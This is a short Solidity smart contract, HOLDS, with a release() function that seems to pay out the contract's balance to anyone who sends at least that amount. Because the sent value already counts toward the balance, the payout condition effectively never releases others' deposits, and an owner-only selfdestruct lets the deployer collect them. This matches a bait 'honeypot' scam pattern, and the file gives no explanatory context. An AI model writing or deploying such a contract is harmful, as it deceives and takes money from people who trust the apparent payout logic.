pragma solidity ^0.4.25;

contract HOLDS
{
    address hodl = msg.sender;
    function() external payable {}
    function end() public {
        if (msg.sender==hodl)
            selfdestruct(msg.sender);
    }
    function release() public payable {
        if (msg.value >= address(this).balance)
            msg.sender.transfer(address(this).balance);
    }
}